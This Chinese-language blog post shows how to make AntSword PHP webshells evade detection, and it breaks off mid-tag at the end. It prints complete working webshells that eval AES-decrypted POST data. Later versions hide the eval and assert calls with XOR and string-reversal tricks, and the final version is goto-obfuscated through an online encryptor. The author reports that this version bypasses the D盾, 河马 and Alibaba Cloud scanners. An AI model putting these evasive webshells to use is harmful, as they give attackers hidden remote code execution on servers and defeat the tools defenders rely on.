{"title":"phpwebshell免杀","uid":"0bde8e350134ac3c0961afd29aadf7f8","slug":"phpwebshell免杀","date":"2023-05-24T02:40:14.000Z","updated":"2023-05-24T02:41:50.881Z","comments":true,"path":"api/articles/phpwebshell免杀.json","keywords":null,"cover":[],"content":"<h1 id=\"AntSword\"><a href=\"#AntSword\" class=\"headerlink\" title=\"AntSword\"></a>AntSword</h1><h2 id=\"0x00-前言：\"><a href=\"#0x00-前言：\" class=\"headerlink\" title=\"0x00 前言：\"></a>0x00 前言：</h2><p>为什么会有改造蚁剑的想法，之前看到有做冰蝎的流量加密，来看到绕过waf，改造一些弱特征，通过流量转换，跳过密钥交互。<br>但是，冰蝎需要反编译去改造源码，再进行修复bug，也比较复杂。而AntSword相对于冰蝎来说，不限制webshell，即一句话也可以进行连接，还可以自定义编码器和解码器，可以很容易让流量做到混淆。</p>\n<h2 id=\"0x01-蚁剑介绍及其改编：\"><a href=\"#0x01-蚁剑介绍及其改编：\" class=\"headerlink\" title=\"0x01 蚁剑介绍及其改编：\"></a>0x01 蚁剑介绍及其改编：</h2><p>关于蚁剑的介绍，这里就不多说了，一个连接webshell的管理器，使用前端nodejs进行编码。AntSword给我最大的好处是可以连接一句话木马，而且可以自定义编码器和解码器。这让我们就有了很多种webshell的变换。</p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/11/attach-0a82e563e491ece7552fc6dc1018d193cd60730f.png\" alt=\"image.png\"><br>但是，蚁剑默认的编码器和菜刀都是一样的，这里用burpsuite来进行抓包看下流量。</p>\n<h4 id=\"蚁剑默认流量\"><a href=\"#蚁剑默认流量\" class=\"headerlink\" title=\"蚁剑默认流量\"></a>蚁剑默认流量</h4><p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/11/attach-54e087b0fde3151bf8ae5a93d07a8e1ec83a142c.png\" alt=\"image.png\"><br>返回来的是默认蚁剑的默认流量，所以的话，这里就基本上过不去态势感知和waf，所以很容易想到了编码器和解码器的选择，可以进行流量的改造来进行waf的绕过，先选用最默认的base64进行测试。</p>\n<h4 id=\"默认的base64编码器\"><a href=\"#默认的base64编码器\" class=\"headerlink\" title=\"默认的base64编码器\"></a>默认的base64编码器</h4><p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/11/attach-93748b3aff08e85b4d193217806d45c1357e891d.png\" alt=\"image.png\"><br>但是看到了使用base64编码之后是有eval字样的，这样的话，肯定被态势感知和全流量一体机来进行特征的抓取，肯定会报威胁。</p>\n<h4 id=\"去github上找到蚁剑的编码器和对应的解码器\"><a href=\"#去github上找到蚁剑的编码器和对应的解码器\" class=\"headerlink\" title=\"去github上找到蚁剑的编码器和对应的解码器\"></a>去github上找到蚁剑的编码器和对应的解码器</h4><p>github地址:（<a href=\"https://github.com/AntSwordProject/AwesomeEncoder/tree/master/php\">编码器</a>）<br>这里下载默认的aes-128的默认流量。</p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/11/attach-4601855137ce11ccf52639c6a1fb8c3059d51f76.png\" alt=\"image.png\"><br>默认编码器的webshell</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n@<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pwd</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'ant'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$key</span><span class=\"token operator\">=</span>@<span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">str_pad</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n@<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token function\">openssl_decrypt</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$pwd</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'AES-128-ECB'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">OPENSSL_RAW_DATA</span><span class=\"token operator\">|</span><span class=\"token class-name\">OPENSSL_ZERO_PADDING</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h5 id=\"默认webshell讲解：\"><a href=\"#默认webshell讲解：\" class=\"headerlink\" title=\"默认webshell讲解：\"></a>默认webshell讲解：</h5><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">这里打开session_start，然后截取Cookie中的<span class=\"token constant\">PHPSESSION</span>的<span class=\"token number\">16</span>位。\n然后进行aes加密，密码为pwd<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>再D盾，河马和阿里云进行扫描：</p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/11/attach-4e3ba6ff5a86202b06cefe1f2fdc5612bb001ae3.png\" alt=\"image.png\"><br>河马没有查出来，可能是比较弱<br><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/11/attach-411a48641a7f57721e7aa3c782e923bbb9472587.png\" alt=\"image.png\"><br>阿里云直接报恶意</p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/11/attach-7f98d5afba2f4dc643dffa139212c77be3c26d97.png\" alt=\"image.png\"></p>\n<h4 id=\"初步修改后的webshell：\"><a href=\"#初步修改后的webshell：\" class=\"headerlink\" title=\"初步修改后的webshell：\"></a>初步修改后的webshell：</h4><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n@<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token constant\">E_ALL</span><span class=\"token operator\">^</span><span class=\"token constant\">E_NOTICE</span><span class=\"token operator\">^</span><span class=\"token constant\">E_WARNING</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$data_new</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">&lt;=</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token operator\">^</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$data_new</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$data_new</span><span class=\"token operator\">.</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'ass'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$data_new</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_new</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_new</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$data_new</span><span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_new</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_new</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'ev'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$data_new</span><span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_new</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token variable\">$data_new</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_new</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'($result)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">return</span> <span class=\"token variable\">$data_new</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">decrypto</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">openssl_decrypt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'AES-128-ECB'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">OPENSSL_RAW_DATA</span><span class=\"token operator\">|</span><span class=\"token class-name\">OPENSSL_ZERO_PADDING</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'=:=om>n?o8h9i:j;k*d0e.l/m('</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ass</span><span class=\"token operator\">=</span>ass<span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ass</span><span class=\"token punctuation\">(</span>ev<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">run</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">data</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'#````````#'</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"#`#`#\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">data</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"123456\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$key</span><span class=\"token operator\">=</span>@<span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">str_pad</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$run</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">decrypto</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$run</span><span class=\"token operator\">-></span><span class=\"token property\">data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这里能过去D盾，但是无法绕过阿里云查杀。</p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/11/attach-eff03d60d976593936e0ad0e2b92352adc7afcd9.png\" alt=\"image.png\"><br>所以这里还需要进行代码混淆。（这也是之后webshell免杀常常用到的）</p>\n<h4 id=\"混淆之后的webshell：\"><a href=\"#混淆之后的webshell：\" class=\"headerlink\" title=\"混淆之后的webshell：\"></a>混淆之后的webshell：</h4><p>这里提供php在线加密的站</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">https<span class=\"token punctuation\">:</span><span class=\"token comment\">//enphp.djunny.com/</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里加密之后生成webshell。如下：</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">goto</span> Zc4oD<span class=\"token punctuation\">;</span> UJih6<span class=\"token punctuation\">:</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">decrypto</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">goto</span> LBrqg<span class=\"token punctuation\">;</span> P6YrI<span class=\"token punctuation\">:</span> <span class=\"token variable\">$ass</span> <span class=\"token operator\">=</span> ass<span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> aR6yN<span class=\"token punctuation\">;</span> svn0O<span class=\"token punctuation\">:</span> <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">openssl_decrypt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\\x41\\x45\\x53\\x2d\\x31\\x32\\70\\55\\105\\x43\\x42\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">OPENSSL_RAW_DATA</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">OPENSSL_ZERO_PADDING</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> ATbMy<span class=\"token punctuation\">;</span> LBrqg<span class=\"token punctuation\">:</span> <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> svn0O<span class=\"token punctuation\">;</span> ATbMy<span class=\"token punctuation\">:</span> <span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\x5c\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\\75\\72\\x3d\\157\\x6d\\x3e\\x6e\\x3f\\x6f\\x38\\x68\\71\\151\\x3a\\x6a\\x3b\\x6b\\x2a\\x64\\x30\\x65\\56\\x6c\\57\\155\\50\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> P6YrI<span class=\"token punctuation\">;</span> aR6yN<span class=\"token punctuation\">:</span> <span class=\"token variable\">$ass</span><span class=\"token punctuation\">(</span>ev<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> k6RVH<span class=\"token punctuation\">;</span> k6RVH<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">goto</span> <span class=\"token constant\">DGZMG</span><span class=\"token punctuation\">;</span> WvjFi<span class=\"token punctuation\">:</span> <span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\144\\151\\x73\\160\\x6c\\x61\\x79\\x5f\\145\\162\\x72\\x6f\\162\\x73\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\\117\\146\\x66\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> Wguwk<span class=\"token punctuation\">;</span> <span class=\"token constant\">DGZMG</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">run</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">public</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">data</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\\43\\140\\x60\\140\\140\\x60\\140\\x60\\x60\\43\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\\x23\\140\\x23\\140\\43\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">goto</span> Berxy<span class=\"token punctuation\">;</span> UUYvT<span class=\"token punctuation\">:</span> <span class=\"token variable\">$run</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> apKNY<span class=\"token punctuation\">;</span> Berxy<span class=\"token punctuation\">:</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> @<span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token function\">str_pad</span><span class=\"token punctuation\">(</span><span class=\"token function\">session_id</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\\141\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> UUYvT<span class=\"token punctuation\">;</span> Zc4oD<span class=\"token punctuation\">:</span> @<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> WvjFi<span class=\"token punctuation\">;</span> Wguwk<span class=\"token punctuation\">:</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">goto</span> <span class=\"token constant\">LGJR3</span><span class=\"token punctuation\">;</span> Ef77S<span class=\"token punctuation\">:</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> KvZGg<span class=\"token punctuation\">;</span> rSTXM<span class=\"token punctuation\">:</span> <span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\141\\x73\\x73\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data_new</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_new</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_new</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$data_new</span><span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_new</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_new</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> TQ6r4<span class=\"token punctuation\">;</span> Tbglr<span class=\"token punctuation\">:</span> <span class=\"token keyword\">return</span> <span class=\"token variable\">$data_new</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> FsE2S<span class=\"token punctuation\">;</span> tm2qt<span class=\"token punctuation\">:</span> <span class=\"token keyword\">goto</span> <span class=\"token constant\">I39OV</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> eF7jG<span class=\"token punctuation\">;</span> AqTZZ<span class=\"token punctuation\">:</span> <span class=\"token variable\">$data_new</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$data_new</span> <span class=\"token operator\">.</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> FriN_<span class=\"token punctuation\">;</span> TQ6r4<span class=\"token punctuation\">:</span> <span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\x65\\166\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data_new</span><span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_new</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$data_new</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_new</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\\50\\x24\\x72\\145\\163\\165\\154\\x74\\51\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> Tbglr<span class=\"token punctuation\">;</span> FriN_<span class=\"token punctuation\">:</span> bLexq<span class=\"token punctuation\">:</span> <span class=\"token keyword\">goto</span> gITff<span class=\"token punctuation\">;</span> eF7jG<span class=\"token punctuation\">:</span> RuTl1<span class=\"token punctuation\">:</span> <span class=\"token keyword\">goto</span> rSTXM<span class=\"token punctuation\">;</span> gITff<span class=\"token punctuation\">:</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> tm2qt<span class=\"token punctuation\">;</span> KdSCg<span class=\"token punctuation\">:</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">goto</span> RuTl1<span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">goto</span> d9N4J<span class=\"token punctuation\">;</span> d9N4J<span class=\"token punctuation\">:</span> <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> AqTZZ<span class=\"token punctuation\">;</span> <span class=\"token constant\">LGJR3</span><span class=\"token punctuation\">:</span> <span class=\"token variable\">$data_new</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">goto</span> Ef77S<span class=\"token punctuation\">;</span> KvZGg<span class=\"token punctuation\">:</span> <span class=\"token constant\">I39OV</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">goto</span> KdSCg<span class=\"token punctuation\">;</span> FsE2S<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">goto</span> UJih6<span class=\"token punctuation\">;</span> apKNY<span class=\"token punctuation\">:</span> <span class=\"token function\">decrypto</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$run</span><span class=\"token operator\">-></span><span class=\"token property\">data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>经过加密之后，可以发现，进行了goto的混淆，所以这里就达到了代码混淆。因为之前绕过了D盾和河马，这里直接去阿里云查杀。</p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/11/attach-8c29bea699a223eec48b3e45e05088f66d0790fc.png\" alt=\"image.png\"><br>已经成功绕过阿里云查杀。用burpsuite抓下流量特征。</p>\n<p><img src=\"https://shs3.b.qianxin.com/attack_forum/2022/11/attach-77560ad7feadea54e04b7b70b81036171ff24a78.png\" 